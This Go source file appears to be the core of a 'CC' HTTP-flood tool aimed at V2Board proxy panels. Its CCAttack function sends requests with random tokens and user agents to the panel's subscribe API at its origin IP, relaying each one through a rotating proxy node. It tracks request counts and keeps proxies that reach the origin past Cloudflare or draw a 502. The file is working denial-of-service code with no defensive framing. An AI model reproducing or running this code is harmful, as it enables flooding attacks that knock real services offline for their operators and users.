package utils

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/gofrs/uuid"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	C "github.com/Dreamacro/clash/constant"
	"github.com/go-resty/resty/v2"

	"github.com/thank243/v2board_cc/config"
)

type Nodes struct {
	C.Proxy
}

func urlToMetadata(rawURL string) (addr C.Metadata, err error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}

	port := u.Port()
	if port == "" {
		switch u.Scheme {
		case "https":
			port = "443"
		case "http":
			port = "80"
		default:
			err = fmt.Errorf("%s scheme not Support", rawURL)
			return
		}
	}

	addr = C.Metadata{
		AddrType: C.AtypDomainName,
		Host:     u.Hostname(),
		DstIP:    nil,
		DstPort:  port,
	}
	return
}

func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies Nodes, err error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	baseURL, err := url.Parse(config.Cfg.OriginIP)
	if err != nil {
		return
	}
	baseURL.Path = "api/v1/client/subscribe"
	params := url.Values{}
	u4, _ := uuid.NewV4()
	params.Add("token", strings.ReplaceAll(u4.String(), "-", ""))
	baseURL.RawQuery = params.Encode()

	addr, err := urlToMetadata(baseURL.String())
	if err != nil {
		return
	}

	instance, err := p.DialContext(ctx, &addr)
	if err != nil {
		return
	}
	defer func(instance C.Conn) {
		err = instance.Close()
		if err != nil {
			return
		}
	}(instance)

	transport := &http.Transport{DialContext: func(context.Context, string, string) (net.Conn, error) { return instance, nil }}

	resp, err := resty.New().
		SetTransport(transport).SetTLSClientConfig(&tls.Config{ServerName: config.Cfg.V2boardDomain}).
		R().SetHeaders(map[string]string{"User-Agent": randUA(), "Host": config.Cfg.V2boardDomain}).
		SetContext(ctx).Get(baseURL.String())
	*counts++
	*status = resp.StatusCode()
	var (
		buf map[string]interface{}
	)
	_ = json.Unmarshal(resp.Body(), &buf)
	switch {
	case resp.StatusCode() == 502:
		aliveProxies = *p
		fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
		return
	case !strings.Contains(string(resp.Body()), "cloudflare") && err == nil:
		aliveProxies = *p
		if v, ok := buf["data"]; ok {
			fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
		} else if v, ok = buf["message"]; ok {
			fmt.Printf("[%d] %d %s\n", *counts, resp.StatusCode(), v)
		} else {
			fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
		}
		return
	}
	return
}
